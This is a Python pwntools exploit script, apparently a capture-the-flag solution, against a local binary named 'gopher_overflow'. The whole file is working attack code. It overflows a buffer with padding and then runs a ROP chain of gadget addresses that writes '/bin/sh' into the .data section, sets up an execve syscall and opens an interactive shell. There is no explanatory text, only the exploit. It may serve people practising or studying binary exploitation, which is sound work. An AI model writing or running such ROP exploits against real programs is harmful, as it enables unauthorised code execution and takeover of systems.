#!/usr/bin/python3
from pwn import process, p64

shell = process("./gopher_overflow")

payload  = b""
payload += p64(0x0) * 18     # padding for offset
payload += p64(0x51e600) * 2 # .data [writable] (avoid errors]
payload += p64(0x0) * 10     # padding for offset
payload += p64(0x40c5bf)     # pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
payload += b"/bin/sh\x00"    # pathname
payload += p64(0x47cdb3)     # pop rax; pop rbp; ret;
payload += p64(0x51e600)     # .data
payload += p64(0x0)          # padding for rbp
payload += p64(0x42cb73)     # mov qword ptr [rax], rcx; ret;
payload += p64(0x40c5bf)     # pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
payload += p64(0x0)          # argv = NULL
payload += p64(0x47cdb3)     # pop rax; pop rbp; ret;
payload += p64(0x3b)         # execve()
payload += p64(0x0)          # padding for rbp
payload += p64(0x47a67a)     # pop rdx; ret;
payload += p64(0x0)          # envp = NULL
payload += p64(0x404aa1)     # pop rbx; ret;
payload += p64(0x51e600)     # .data
payload += p64(0x4036c6)     # mov rsi, rcx; mov rdi, rbx; syscall;

shell.sendlineafter(b"gopher? ", payload)
shell.interactive()
